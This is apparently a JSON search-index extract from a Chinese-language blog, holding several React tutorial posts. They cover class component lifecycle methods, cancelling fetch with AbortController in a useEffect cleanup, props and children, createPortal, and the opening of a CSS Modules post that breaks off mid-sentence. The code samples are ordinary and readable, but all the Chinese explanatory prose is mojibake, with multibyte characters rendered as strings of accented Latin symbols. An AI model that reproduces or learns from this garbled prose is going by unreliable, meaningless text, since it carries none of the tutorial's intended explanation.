ç¬¬å››å€‹æœƒè¢«åŸ·è¡Œçš„ functionï¼Œåœ¨ã€ŒæŠŠæ±è¥¿æ”¾åˆ°ç•«é¢ä¸Šä»¥å¾Œã€æ‰è¢«åŸ·è¡Œã€‚ 123456789101112131415161718192021class App extends React.Component { constructor(props) { console.log(\"1. constructor\"); super(props); // åŸæœ¬æ˜¯ red this.state = { favoritecolor: \"red\" }; } componentDidMount() { console.log(\"3. componentDidMount\"); // ä¸€ç§’å¾Œæ”¹æˆç¶ è‰² setTimeout(() =&gt; { this.setState({ favoritecolor: \"green\" }); }, 1000); } render() { console.log(\"2. render\"); return &lt;h1&gt;My Favorite Color is {this.state.favoritecolor}&lt;/h1&gt;; }} ç¯„ä¾‹å¯ä»¥åˆ° é€™è£¡ åƒè€ƒã€‚ æœ€å¾Œåœ¨å¼·èª¿ä¸€ä¸‹ï¼Œåªæœ‰ render è·Ÿ getDerivedStateFromProps æœƒåœ¨æ¯æ¬¡ re-render çš„æ™‚å€™æœƒè¢«åŸ·è¡Œï¼Œå…¶ä»–å…©å€‹éƒ½åªæœ‰ä¸€æ¬¡ï¼Œå¯ä»¥åˆ° é€™è£¡ åƒè€ƒçœ‹çœ‹ã€‚ Update éšæ®µåŸ·è¡Œé †åºï¼š getDerivedStateFromProps() shouldComponentUpdate() render() getSnapshotBeforeUpdate() componentDidUpdate() getDerivedStateFromPropså‰›å‰›æœ‰èªªé re-render çš„æ™‚å€™é€™å€‹æœƒåœ¨åŸ·è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥é€™é‚Šå®ƒå°±æ˜¯ç¬¬ä¸€å€‹æœƒå…ˆè¢«åŸ·è¡Œçš„ functionã€‚ shouldComponentUpdateå¤§æ¦‚æ˜¯æœ€å¸¸çœ‹åˆ°çš„ä¸€å€‹ functionï¼Œç¸½ä¹‹å®ƒæ˜¯ä¸€å€‹è »é‡è¦çš„ functionï¼Œå¯ä»¥æ±ºå®šè¦ä¸è¦ re-renderï¼Œç«¯çœ‹ä½ çµ¦çš„å›å‚³å€¼æ˜¯ true / falseï¼Œå¦å¤–æœƒæ¥æ”¶å…©å€‹åƒæ•¸æ˜¯ nextProps å’Œ nextStateï¼š 12345678910111213141516171819202122232425262728class App extends React.Component { constructor(props) { super(props); this.state = { counter: 0 }; } shouldComponentUpdate(nextProps, nextState) { console.log(\"shouldComponentUpdate\"); console.log(\"props\", nextProps); console.log(\"state\", nextState); return false; } render() { return ( &lt;div&gt; &lt;div&gt;å›å‚³ falseï¼Œæ‰€ä»¥ä¸ re-render&lt;/div&gt; &lt;div&gt;Counter: {this.state.counter}&lt;/div&gt; &lt;button onClick={() =&gt; this.setState({ counter: this.state.counter + 1 })} &gt; add &lt;/button&gt; &lt;/div&gt; ); }}ReactDOM.render(&lt;App ppp=\"yo\" /&gt;, document.getElementById(\"root\")); ç¯„ä¾‹ä¸€æ¨£åˆ° é€™é‚Š çœ‹ã€‚ renderrender æ¯ä¸€æ¬¡ re-render éƒ½æœƒè¢«åŸ·è¡Œï¼Œæ‰€ä»¥åœ¨é€™å€‹éšæ®µä¸­ç•¶ç„¶ä¹Ÿæœƒã€‚ é€™é‚Š render è¦åšçš„äº‹æƒ…å°±æ˜¯æŠŠæ›´æ–° state å¾Œçš„ HTML åæ‡‰ DOM ä¸Šé¢ï¼ˆæ³¨æ„æ˜¯ DOM ä¸æ˜¯ç•«é¢ï¼‰ï¼Œé€™é‚Šå°±ä¸ç¤ºç¯„äº†ã€‚ getSnapshotBeforeUpdateé€™å€‹å–åé‚„çœŸæœ‰æ„æ€ï¼Œå°±æ˜¯èƒ½åœ¨é€™é‚Šæ‹¿åˆ°ã€Œæ›´æ–°å‰çš„ stateã€ï¼Œæ‰€ä»¥ä¹¾è„†ä¾†æ‹å¼µç…§åšç´€å¿µå¥½äº†ï¼ˆï¼Ÿ é€™é‚Šæ­é… componentDidMount ä¾†åšå€‹ç¤ºç¯„ï¼ŒåŸæœ¬çš„é¡è‰²æ˜¯ redï¼Œä½†æœƒæ”¹æˆ yellowï¼Œè€Œ getSnapshotBeforeUpdate æœƒæŠŠæ›´æ–°å‰çš„ state å°åˆ°ç•«é¢ä¸Šï¼š 1234567891011121314151617181920212223242526272829303132class App extends React.Component { constructor(props) { super(props); this.state = { favoriteColor: \"red\" }; } componentDidMount() { // ç•«é¢ paint å®Œä¸€ç§’å¾Œæ›´æ–° stateï¼Œè§¸ç™¼ re-render setTimeout(() =&gt; { this.setState({ favoriteColor: \"yellow\" }); }, 1000); } // W3C æ˜¯å¯«èªªè¦æ­é… componentDidUpdate ä¾†ç”¨ï¼Œå¦å‰‡æœƒå‡ºéŒ¯ // ä½†é€™é‚Šåœ¨ codepen ä¸Šæ¸¬è©¦æ˜¯ OKï¼Œæ‰€ä»¥å…ˆé€™æ¨£å¯« getSnapshotBeforeUpdate(prevProps, prevState) { document.getElementById(\"div1\").innerHTML = ` before update state, the favorite color was ${prevState.favoriteColor} `; } render() { return ( &lt;div&gt; &lt;h1&gt;My Favorite Color is {this.state.favoriteColor}&lt;/h1&gt; &lt;div id=\"div1\"&gt;&lt;/div&gt; &lt;/div&gt; ); }}ReactDOM.render(&lt;App /&gt;, document.getElementById(\"root\")); ä¸å¤ªæ‡‚çš„è©±å°±ç›´æ¥åˆ°é€™è£¡çœ‹ ç¯„ä¾‹ å§ã€‚ componentDidUpdateå°±æ˜¯ã€Œæ›´æ–°å®Œä»¥å¾Œã€æœƒè¢«åŸ·è¡Œçš„ functionï¼Œé€™é‚Šæ²¿ç”¨å‰›å‰› getSnapshotBeforeUpdate çš„ç¯„ä¾‹ï¼Œçœ‹ä¸€ä¸‹æ‡‰è©²å°±çŸ¥é“åœ¨å¹¹å˜›äº†ï¼š 123456789101112131415161718192021222324252627282930313233343536373839class App extends React.Component { constructor(props) { super(props); this.state = { favoriteColor: \"red\" }; } componentDidMount() { // ç•«é¢ paint å®Œä¸€ç§’å¾Œæ›´æ–° stateï¼Œè§¸ç™¼ re-render setTimeout(() =&gt; { this.setState({ favoriteColor: \"yellow\" }); }, 1000); } // æ‹¿åˆ°æ›´æ–°å‰çš„å€¼ getSnapshotBeforeUpdate(prevProps, prevState) { document.getElementById(\"div1\").innerHTML = ` before update state, the favorite color was ${prevState.favoriteColor} `; } // æ‹¿åˆ°æ›´æ–°å¾Œçš„å€¼ // å› ç‚ºæ˜¯æ›´æ–°ä»¥å¾Œæ‰è¢«åŸ·è¡Œï¼Œæ‰€ä»¥ this.state å°±æœƒæ˜¯æ–°çš„ state componentDidUpdate() { document.getElementById(\"div2\").innerHTML = ` after update state, the favorite color is ${this.state.favoriteColor} `; } render() { return ( &lt;div&gt; &lt;h1&gt;My Favorite Color is {this.state.favoriteColor}&lt;/h1&gt; &lt;div id=\"div1\"&gt;&lt;/div&gt; &lt;div id=\"div2\"&gt;&lt;/div&gt; &lt;/div&gt; ); }}ReactDOM.render(&lt;App /&gt;, document.getElementById(\"root\")); ä¸€æ¨£é™„ä¸Š ç¯„ä¾‹ã€‚ Unmounting éšæ®µç°¡ç•¥ä¾†èªªæ‡‰è©²åªæœ‰é€™ä¸€å€‹ï¼šcomponentWillUnmount componentWillUnmountå°±æ˜¯åœ¨ã€Œå…ƒä»¶å¾ç•«é¢ä¸Šç§»é™¤å‰ã€è¦åšä»€éº¼ï¼Ÿç›´æ¥çœ‹ ç¯„ä¾‹ï¼š 12345678910111213141516171819202122232425262728class Header extends React.Component { componentWillUnmount() { alert(\"Before Header ummount\"); } render() { return &lt;h1&gt;Hello I'm header&lt;/h1&gt;; }}class App extends React.Component { constructor(props) { super(props); this.state = { show: true }; } render() { return ( &lt;div&gt; {this.state.show &amp;&amp; &lt;Header /&gt;} &lt;button onClick={() =&gt; this.setState({ show: !this.state.show })}&gt; Toggle header &lt;/button&gt; &lt;/div&gt; ); }}ReactDOM.render(&lt;App /&gt;, document.getElementById(\"root\"));","link":"/2022/04/21/react-class-life-cycle-review/"},{"title":"React class component çš„ç”Ÿå‘½é€±æœŸ","text":"åˆæ˜¯ç”Ÿå‘½é€±æœŸï½ ç”Ÿå‘½é€±æœŸä¸€å€‹ component çš„ç”Ÿå‘½é€±æœŸä¸»è¦èƒ½åˆ†æˆä¸‰å€‹éšæ®µï¼š Mount Update Unmount å¦å¤–å…ˆæé†’ä¸€ä¸‹ï¼Œç­‰ä¸€ä¸‹ä»‹ç´¹çš„ method éƒ½æœƒè‡ªå‹•ç¶å®š this å€¼ï¼ˆå› ç‚ºæ˜¯ React å¹«ä½ å‘¼å«é€™äº› method çš„ï¼‰ï¼Œæ‰€ä»¥ä¸ç”¨åƒå¯« handler é‚£æ¨£è¦è‡ªå·±ç¶å®šã€‚ Mount éšæ®µåœ¨ Mount ä¸»è¦æœƒç¶“æ­·é€™å¹¾æ®µï¼š åŸ·è¡Œ constructor åˆå§‹åŒ– static getDerivedStateFromProps æœƒåœ¨ render å‰è§¸ç™¼ï¼Œä½†ä¸ç”¨ç®¡é€™å€‹ componentWillMountï¼Œmount ä»¥å‰ï¼Œä½†ä¸æ¨è–¦ä½¿ç”¨ï¼Œä¹Ÿæ‡‰è©²å¿«è¢«å»¢æ£„äº†ã€‚ render åŸ·è¡Œ render method componentDidMountï¼Œmount ä¹‹å¾Œï¼Œé©åˆåœ¨é€™å€‹éšæ®µæ‰“ API 123456789101112131415161718192021222324252627class Demo extends React.Component { constructor(props) { console.log(\"constructor\"); super(props); this.state = { counter: 0, }; } // ä¸æ¨è–¦ä½¿ç”¨ componentWillMount() { console.log(\"before mount\"); } componentDidMount() { console.log(\"after mount\"); } render() { console.log(\"render\"); return ( &lt;div&gt; &lt;div&gt;counter: {this.state.counter}&lt;/div&gt; &lt;button onClick={this.handleClick}&gt;+1&lt;/button&gt; &lt;/div&gt; ); }} Update éšæ®µåœ¨ Update ä¸»è¦æœƒç¶“æ­·é€™å¹¾æ®µï¼š shouldComponentUpdate åœ¨ update ä¹‹å‰ï¼Œå¯ä»¥åœ¨é€™è£¡æ±ºå®šè¦ä¸è¦æ›´æ–° componentï¼ˆå›å‚³ true æˆ– falseï¼‰ componentWillUpdate åœ¨ç¢ºå®šæœƒæ›´æ–°å¾Œï¼ŒçœŸçš„æ›´æ–°æ±è¥¿ä»¥å‰ï¼ˆä¹Ÿæ˜¯æœƒå»¢æ£„çš„æ±è¥¿ï¼ŒçŸ¥é“ä¸€ä¸‹å°±å¥½ï¼‰ renderï¼ŒåŸ·è¡Œ render method componentDidUpdate å·²ç¶“æ›´æ–°å®Œæ±è¥¿äº†ï¼Œé€™é‚Šæœƒé †ä¾¿çµ¦ä½ æ›´æ–°å‰çš„ props å’Œ state æ¥ä¸‹ä¾†é€™å€‹ç¤ºç¯„æ˜¯æ¯æ¬¡ update ä»¥å‰æœƒå…ˆç”¨ shouldComponentUpdate æª¢æŸ¥ï¼Œç¢ºèªæ›´æ–°å¾Œçš„å€¼æ˜¯å¦ &lt; 5ï¼Œç¬¦åˆçš„è©±æ‰é€²è¡Œæ›´æ–° 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Demo extends React.Component { constructor(props) { console.log(\"constructor\"); super(props); // åªèƒ½æ˜¯ Object this.state = { counter: 0, }; } componentWillUpdate() { console.log(\"before update\"); } // æœƒçµ¦ä½ ä¸Šä¸€æ¬¡çš„ props å’Œ state componentDidUpdate(prevProps, prevState) { console.log(\"after update\"); console.log(\"prevState\", prevState); } // return true ? æ›´æ–° : ä¸æ›´æ–° // æœƒæä¾›æ›´æ–°å¾Œçš„ props è·Ÿ state shouldComponentUpdate(nextProps, nextState) { console.log(\"shouldComponentUpdate\"); // å°æ–¼ 5 æ‰æ›´æ–° return nextState.counter &lt; 5; } handleClick = () =&gt; { this.setState({ counter: this.state.counter + 1, }); }; render() { console.log(\"render\"); return ( &lt;div&gt; &lt;div&gt;counter: {this.state.counter}&lt;/div&gt; &lt;button onClick={this.handleClick}&gt;+1&lt;/button&gt; &lt;/div&gt; ); }} UnMount éšæ®µé€™å€‹å°±ç›¸å°ç°¡å–®ä¸€äº›ï¼Œå°±æ˜¯åœ¨å…ƒä»¶è¦è¢«å¾ç•«é¢ä¸Šç§»é™¤ä¹‹å‰å¯ä»¥ç”¨ componentWillUnmount ä¾†åšäº‹æƒ…ã€‚ é€™å€‹ç¤ºç¯„æ˜¯ç•¶ counter &lt; 1 çš„æ™‚å€™æ‰é¡¯ç¤º TestText å…ƒä»¶ï¼Œæ‰€ä»¥ç•¶ä¸ç¬¦åˆæ™‚ TestText å°±æœƒè¢«ç§»é™¤æ‰ï¼Œè§¸ç™¼ componentWillUnmountï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041class TestText extends React.Component { componentDidMount() { console.log(\"TestText after mount\"); } // unmount ä»¥å‰ componentWillUnmount() { console.log(\"TestText before unmount\"); } render() { return &lt;div&gt;yoyoyo&lt;/div&gt;; }}class Demo extends React.Component { constructor(props) { console.log(\"constructor\"); super(props); this.state = { counter: 0, }; } handleClick = () =&gt; { this.setState({ counter: this.state.counter + 1, }); }; render() { console.log(\"render\"); return ( &lt;div&gt; &lt;div&gt;counter: {this.state.counter}&lt;/div&gt; &lt;button onClick={this.handleClick}&gt;+1&lt;/button&gt; {this.state.counter &lt; 1 &amp;&amp; &lt;TestText /&gt;} &lt;/div&gt; ); }} ä»¥ä¸Šå°±æ˜¯åŸºæœ¬çš„ç”Ÿå‘½é€±æœŸï¼Œåªè¦çŸ¥é“åœ¨æ¯å€‹éšæ®µéƒ½æœƒæœ‰å°æ‡‰çš„ method å¯ä»¥ä½¿ç”¨å°±å·®ä¸å¤šäº†ã€‚ PureComponentæœ€å¾Œè£œå……ä¸€ä¸‹ PureComponent é€™æ±è¥¿ã€‚ å‰é¢æœ‰ä»‹ç´¹å¯ä»¥ç”¨ shouldComponentUpdate ä¾†æ±ºå®šè¦ä¸è¦è§¸ç™¼ Component çš„æ›´æ–°ï¼Œä½†å¦‚æœè¦è‡ªå·±å¯«å¥½åƒè »éº»ç…©çš„ï¼Ÿ å› æ­¤ React æœ‰æä¾› PureComponentï¼Œåªè¦åœ¨å‰µé€  Component æ™‚ç”¨å®ƒï¼Œå®ƒå°±æœƒè‡ªå‹•å¹«ä½ è¨­å®š shouldComponentUpdateï¼Œåªæœ‰åœ¨ props æ”¹è®Šæ™‚æ‰è§¸ç™¼æ›´æ–°ï¼ˆè·Ÿ hook çš„ memo å·®ä¸å¤šï¼‰ 1234class Demo extends React.PureComponent { // æ¯ç•¶ props æ”¹è®Šæ™‚æ‰æ›´æ–° ...}","link":"/2022/04/08/react-class-life-cycle/"},{"title":"Reactï¼é€™å€‹ fetch æˆ‘å‰›å‰›è¦ä½†ç¾åœ¨åˆä¸è¦äº†","text":"æœ‰å¤ ä»»æ€§ã€‚ ç°¡è¿°é€™ç¯‡å…¶å¯¦æ˜¯è¦ä»‹ç´¹å…©å€‹æ±è¥¿ï¼š clean functionï¼ˆuseEffectï¼‰ çš„é©ç”¨æ™‚æ©Ÿ AbortController èªªçœŸå¾—æˆ‘é‚„è »å°‘ç”¨åˆ°é€™å…©æ¨£æ±è¥¿çš„ï¼Œæ‰€ä»¥æƒ³è¨˜éŒ„ä¸€ä¸‹ã€‚ ç¯„ä¾‹å‡è¨­æœ‰ä¸€å€‹ Component çš„å…§å®¹æ˜¯é€é useEffect ä¾†å¾ API å–å¾—è³‡æ–™çš„ã€‚é‚£éº¼ã€Œå¦‚æœæˆ‘åœ¨ fetch çš„æœŸé–“å°±æŠŠ Component unmount çš„è©±ã€ï¼Œæœƒç™¼ç”Ÿä»€éº¼äº‹ï¼Ÿ é€™é‚Šå…ˆçœ‹ä¸€æ®µ codeï¼Œæœƒæ¯”è¼ƒå¥½æ‡‚é€™æ˜¯ä»€éº¼æ„æ€ï¼š 123456789101112131415import Button from \"Button\";import { useState } from \"react\";import TripList from \"TripList\";export default function App() { // æ§åˆ¶ List æ˜¯å¦é¡¯ç¤ºçš„ state const [showTripList, setShowTripList] = useState(true) return ( &lt;div\"&gt; &lt;h2&gt;Trip List&lt;/h2&gt; &lt;button onClick={() =&gt; setShowTripList(false)}&gt;Cancel fetching&lt;/button&gt; {showTripList &amp;&amp; &lt;TripList /&gt;} &lt;/div&gt; );} é€™é‚Šä¸ç”¨ç®¡ &lt;TripList /&gt; æ˜¯ä»€éº¼ï¼Œåªè¦çŸ¥é“ä»–æœƒç”¨ useEffect ä¾†æ‰“ API æ‹¿è³‡æ–™å°±å¥½ã€‚ è‡³æ–¼ &lt;Button&gt; çš„ä½œç”¨æ˜¯æŠŠ &lt;TripList /&gt; å¾ç•«é¢ä¸Šç§»é™¤ï¼Œä¹Ÿå°±æ˜¯å‰é¢èªªçš„ unmountã€‚ æ‰€ä»¥ç¾åœ¨çš„æƒ…æ³æ˜¯ï¼Œå¦‚æœæˆ‘åœ¨ &lt;TripList /&gt; é‚„åœ¨ fetch çš„æœŸé–“å°±æŒ‰ä¸‹ &lt;Button /&gt; çš„è©±ï¼Œæœƒç™¼ç”Ÿä»€éº¼äº‹ï¼Ÿ æ²’æ„å¤–çš„è©±ä½ æ‡‰è©²æœƒå¾—åˆ°é€™å€‹è¨Šæ¯ï¼š Warning: Canâ€™t perfrom a React state update on an unmounted component. This is a no-op, â€¦.. é™„è¨»ï¼šå¾Œä¾†çš„ React ä¼¼ä¹æœ‰åšä¸€é»èª¿æ•´ï¼Œæ‰€ä»¥ä¸æœƒçœ‹åˆ°é€™å€‹è¨Šæ¯ã€‚ ä»–çš„æ„æ€æ˜¯èªªï¼Œã€Œæˆ‘ç¾åœ¨è¦æ›´æ–° stateï¼Œä½†é‚£å€‹ Component å·²ç¶“ä¸å­˜åœ¨äº†ï¼Œå®‰æå˜ä¸Ÿï¼Ÿã€ æˆ‘å€‘å¯ä»¥å…ˆæ€è€ƒä¸€ä¸‹æ•´å€‹æµç¨‹ï¼Œå°±æœƒæ¯”è¼ƒæ¸…æ¥šç‚ºä»€éº¼æœƒæ˜¯é€™ç¨®çµæœäº†ï¼š ä¸€é–‹å§‹ showTripList ç‚º trueï¼Œæ‰€ä»¥æœƒæ¸²æŸ“ &lt;TripList /&gt; &lt;TripList /&gt; é–‹å§‹ fetch è³‡æ–™ æŒ‰ä¸‹ &lt;Button /&gt; æŠŠ &lt;TripList /&gt; å¾ç•«é¢ä¸Šç§»é™¤æ‰ï¼ˆunmountï¼‰ fetch å›ä¾†äº†ï¼Œæ›´æ–°åŸæœ¬ç”¨ä¾†å„²å­˜è³‡æ–™çš„ state ç™¼ç¾ Component ä¸å­˜åœ¨ï¼Œæ‰€ä»¥é¡¯ç¤º Warning é€™é‚Šç†è§£å¾Œï¼Œå°±å¯ä»¥ç¹¼çºŒå¾€ä¸‹æ€è€ƒè©²æ€éº¼è§£æ±ºäº†ã€‚ è¦æ€éº¼åœ¨å…ƒä»¶ unmount çš„æ™‚å€™æŠŠ fetch å–æ¶ˆï¼Ÿé€™å€‹æ˜¯æœ€æ ¸å¿ƒçš„å•é¡Œï¼Œæ‰€ä»¥æ‰åˆ»æ„ç”¨æ¨™é¡Œä¾†é†’ç›®ã€‚ä¸éæˆ‘å…¶å¯¦åœ¨ä¸€é–‹å§‹å°±æœ‰å…ˆæ´©æ¼äº†ï¼Œå°±æ˜¯é€é clean function è·Ÿ AbortController ä¾†å¯¦ç¾ã€‚ è¦ trigger clean function çš„æ–¹å¼å¾ˆç°¡å–®ï¼Œå°±æ˜¯ã€Œåœ¨ useEffect è£¡é¢å›å‚³ä¸€å€‹ functionã€ï¼Œåƒé€™æ¨£ï¼š 12345678useEffect(() =&gt; { ... ... ... // clean function () =&gt; {...}}, []) è€Œè¦å–æ¶ˆ fetch çš„æ–¹å¼å°±æ˜¯ç”¨ AbortController ä¾†åšé€£çµã€‚ ç›´æ¥ä¾†çœ‹ç¯„ä¾‹å§ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041import { useEffect, useState } from \"react\";const API = \"https://reqres.in/api/users?page=1\";const sleep = (ms) =&gt; new Promise((resolve) =&gt; setTimeout(() =&gt; resolve(), ms));export default function TripList() { const [data, setData] = useState([]); const [isPending, setIsPending] = useState(false); const [error, setError] = useState(null); useEffect(() =&gt; { // å»ºç«‹ instance const controller = new AbortController(); const fetchData = async () =&gt; { setIsPending(true); setError(null); try { await sleep(1000); // ç”¨ signal æŠŠ fetch å’Œ controller ä¸²é€£èµ·ä¾† const response = await fetch(API, { signal: controller.signal }); if (!response.ok) throw new Error(response.statusText); const json = await response.json(); setData(json.data); } catch (err) { // For developer console.log(\"ğŸ‘‰ Exception message: \", err.message); // åœ¨ AbortError æ™‚ä¸è¦æ›´æ–° state err.name === \"AbortError\" ? console.log(\"User abort the fetch\") : setError(\"Can not fetch the data\"); } finally { setIsPending(false); } }; fetchData(); // unmount æ™‚å°±åŸ·è¡Œé€™å€‹ clean function return () =&gt; controller.abort(); }, []); return ...;} æ”¹æˆé€™æ¨£ä»¥å¾Œï¼Œå¦‚æœåœ¨ fetch çš„ç‹€æ…‹ä¸‹é»äº† &lt;Button /&gt;ï¼Œå°±æœƒæŠŠ &lt;TripList /&gt; çµ¦ç§»é™¤æ‰ï¼ŒåŸ·è¡Œ () =&gt; controller.abort() æŠŠ fetch çµ¦å–æ¶ˆæ‰ã€‚ å–æ¶ˆçš„åŒæ™‚æœƒæ‹‹å‡ºä¸€å€‹ AbortError çš„ Exceptionï¼Œæ‰€ä»¥æœƒé€²åˆ° cache å€å¡Šã€‚ä½†è¦æ³¨æ„ï¼Œè«‹å‹™å¿…è¨˜å¾—å¤šåšä¸€å±¤ã€Œæ˜¯ä¸æ˜¯ AbortErrorã€çš„åˆ¤æ–·ï¼Œç‚ºä»€éº¼ï¼Ÿ å› ç‚ºæˆ‘å€‘å°±æ˜¯å¸Œæœ› Abort çš„æƒ…æ³ä¸‹ä¸è¦æ›´æ–° stateï¼Œæ‰€ä»¥æ‰è¦æª¢æŸ¥ Error çš„å‹åˆ¥ï¼ŒæŠŠå®ƒè·Ÿä¸€èˆ¬çš„éŒ¯èª¤è™•ç†å€åˆ¥é–‹ä¾†ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œå¦‚æœé‚„æ˜¯ä¼¼æ‡‚éæ‡‚çš„è©±ï¼Œå¯ä»¥åˆ°æˆ‘å¯«çš„ ç¯„ä¾‹ ä¾†è©¦è©¦çœ‹ã€‚å¸Œæœ›ä¹‹å¾Œèƒ½å–„ç”¨é€™é …æŠ€è¡“å¯«å‡ºæ›´å¥½çš„ codeã€‚","link":"/2022/06/11/react-clean-function/"},{"title":"React ä¹‹ Component åŸºç¤","text":"ä¸è¦æƒ³çš„å¤ªè¤‡é›œã€‚ æŠŠæ±è¥¿å‚³çµ¦ Componentï¼šprops123456789101112// æ¥æ”¶åˆ° props åƒæ•¸function Person (props) { return &lt;div&gt;{props.name} | {props.age} | {props.gender}&lt;/div&gt;}ReactDOM.render( &lt;React.StrictMode&gt; // å‚³é€²å» Component &lt;Person name=\"Peanu\" age=\"20\" gender=\"man\"/&gt; &lt;/React.StrictMode&gt;, document.getElementById('root')); åœ¨ Component è£¡é¢å¡æ±è¥¿ï¼šchildren12345678910111213141516171819function Person (props) { return ( &lt;div&gt; // ç”¨ children æ¥æ”¶ {props.children} &lt;br /&gt; {props.name} | {props.age} | {props.gender} &lt;/div&gt; )}ReactDOM.render( &lt;React.StrictMode&gt; &lt;Person name=\"Peanu\" age=\"20\" gender=\"man\"&gt; // å¤¾åœ¨è£¡é¢ Hello &lt;/Person&gt; &lt;/React.StrictMode&gt;, document.getElementById('root')); å¦‚æœæƒ³å¯«æˆ &lt;Component /&gt; çš„æ ¼å¼ä¹Ÿè¡Œï¼š 12345678910function Person ({ children }) { return &lt;div&gt;{children}&lt;/div&gt;}ReactDOM.render( &lt;React.StrictMode&gt; &lt;Person children=\"helloooo\" /&gt; &lt;/React.StrictMode&gt;, document.getElementById('root'));","link":"/2022/04/05/react-component-basic/"},{"title":"Reactï¼ç”¨ portal æŠŠå…ƒä»¶ç§»åˆ°æˆ‘æƒ³è¦çš„ä½ç½®","text":"é —é‚Šç·£çš„ Methodã€‚ ç°¡è¿°å°±å¦‚æ¨™é¡Œæ‰€èªªçš„ï¼Œæœ‰æ™‚å€™æˆ‘å€‘å¯èƒ½æœƒæƒ³èª¿æ•´å…ƒä»¶åœ¨ HTM ï¼¬ä¸­çš„ä½ç½®ã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­æˆ‘å€‘æœ‰ä¸€å€‹ Appï¼Œè£¡é¢æœ‰ Modal é€™å€‹å…ƒä»¶ï¼Œé‚£åœ¨ HTML ä¸­å°±æœƒé€™æ¨£å‘ˆç¾ï¼š Modal æœƒæ”¾åœ¨ App è£¡é¢ï¼Œåˆæƒ…åˆç†ã€‚ ä¸éæœ‰æ²’æœ‰è¾¦æ³•æŠŠä»–è®Šæˆé€™æ¨£å­ï¼Ÿ åƒé€™æ¨£å­æŠŠ Modal æ”¾åˆ° body çš„æœ€å¾Œé¢ã€‚ é‚„çœŸçš„æœ‰ï¼Œå°±æ˜¯ç”¨ ReactDOM çš„ createPortal ä¾†å¯¦ç¾ï¼š 12345678910111213141516import React from 'react'import ReactDOM from 'react-dom'export default function Modal({ children, setModal }) { return ReactDOM.createPortal( &lt;div className='modal-backdrop'&gt; &lt;div className='modal'&gt; {children} &lt;button className='btn' onClick={() =&gt; setModal(false)}&gt; Close &lt;/button&gt; &lt;/div&gt; &lt;/div&gt;, document.body )} ç¬¬ä¸€å€‹åƒæ•¸æ”¾ JXSï¼Œç¬¬äºŒå€‹åƒæ•¸å‰‡æ˜¯æ”¾ä½ æƒ³è¦çš„ DOM å…ƒç´ ï¼Œä»¥é€™å€‹ä¾‹å­ä¾†èªªæˆ‘é¸æ“‡çš„æ˜¯ body é€™å€‹å…ƒç´ ã€‚ åªè¦æ”¹ç”¨é€™ç¨®æ–¹å¼å¾Œå°±èƒ½è‡ªè¡Œæ±ºå®šå…ƒä»¶çš„æ¸²æŸ“ä½ç½®å›‰ã€‚","link":"/2022/06/09/react-create-portal/"},{"title":"Reactï¼CSS Module","text":"ä»€éº¼éƒ½è¦ä¾†é» moduleã€‚ ç°¡è¿°åœ¨ React è£¡å¯« style é™¤äº† inline-styleã€className å’Œ CSS-In-JS ä»¥å¤–ï¼Œé‚„æœ‰ä¸€ç¨®å¯«æ³•å«åš CSS Moduleï¼Œé€™ç¨®å¯«æ³•é‚„è »æœ‰æ„æ€çš„ï¼Œæ‰€ä»¥æƒ³è¨˜éŒ„ä¸€ä¸‹ã€‚ ç‚ºä»€éº¼éœ€è¦ moduleï¼Ÿåœ¨è¬› module ä»¥å‰ï¼Œæˆ‘è¦ºå¾—å…ˆèªè­˜ä¸€ä¸‹ã€Œæ²’æœ‰ moduleã€çš„ä¸–ç•Œé•·ä»€éº¼æ¨£ï¼Ÿèƒ½å¤ å¹«åŠ©ä½ é‡æ¸… module çš„ç”¨é€”æ‰€åœ¨ã€‚ å‡è¨­æˆ‘æœ‰ä¸€å€‹ Button å…ƒä»¶é•·é€™æ¨£ï¼š 123export default function Button () { return &lt;button&gt;click me&lt;/button&gt;} å¦‚æœæˆ‘æƒ³å¹«ä»–åŠ ä¸Šä¸€é» styleï¼Œæˆ‘å¯èƒ½æœƒé–‹ä¸€éš» button.css ä¾†å¯«ä¸€å€‹çµ¦ Button ç”¨çš„ classNameï¼š 1234567/* button.css */.btn { color: white; background-color: dodgerblue; padding: 4px 8px; border: unset;} æ¥è‘—åœ¨ Button ä¸­å¼•å…¥é€™éš» CSSï¼Œå†åŠ ä¸Š classNameï¼š 12345import \"./button.css\";export default function Button () { return &lt;button className=\"btn\"&gt;click me&lt;/button&gt;} é€™æ¨£å­ Button å°±æœƒé¡¯ç¤ºæˆ‘å€‘åŠ ä¸Šçš„æ¨£å¼äº†ï¼Œçœ‹èµ·ä¾†å¥½åƒå¾ˆåˆç†å•Šï¼Ÿæœ‰ä»€éº¼å•é¡Œå—ï¼Ÿ æ²’éŒ¯ï¼Œé€™æ¨£å­ç¢ºå¯¦å¯ä»¥è®“ Button åƒåˆ°æ¨£å¼ï¼Œä½†æœ‰ä¸€ä»¶å¾ˆé‡è¦çš„äº‹æƒ…ä¸€å®šè¦ææ¸…æ¥šï¼š å³ä¾¿æˆ‘åªæœ‰åœ¨ Button ä¸­å¼•å…¥ CSS æª”æ¡ˆï¼Œé€™ä¹Ÿä¸ä»£è¡¨é€™äº›æ¨£å¼åªæœƒå¥—ç”¨åˆ° Button ä¸Šï¼Œä»–ä¾ç„¶æ˜¯ Global Styleã€‚ ä»€éº¼æ„æ€ï¼Ÿæ„æ€æ˜¯èªªï¼Œå‡è¨­æˆ‘åœ¨åˆ¥çš„å…ƒä»¶ä¸­ä¹Ÿç”¨äº† btn é€™å€‹ classNameï¼Œé‚£ä»–ä¸€æ¨£æœƒå¥—ç”¨åˆ°æ¨£å¼ã€‚ é€™å€‹å°±æ˜¯æ²’æœ‰ module æœƒæœ‰çš„å•é¡Œï¼Œæ²’è¾¦æ³•ç”¢ç”Ÿ scopeã€‚ æ‰€ä»¥å‘¢ï¼ŒCSS Module å°±æ˜¯ç”¨ä¾†è§£æ±º scope çš„å•é¡Œè€Œèª•ç”Ÿçš„ä¸€ç¨®å¯«æ³•ã€‚ ä½¿ç”¨ CSS Moudleè¦ä½¿ç”¨ CSS Module çš„è©±ï¼Œé¦–å…ˆæˆ‘å€‘å¾—å»ºç«‹ä¸€æ”¯ *.module.css çš„æª”æ¡ˆã€‚é€™é‚Šå¼·èª¿ä¸€ä¸‹ï¼Œé€™å€‹ä¸æ˜¯å› 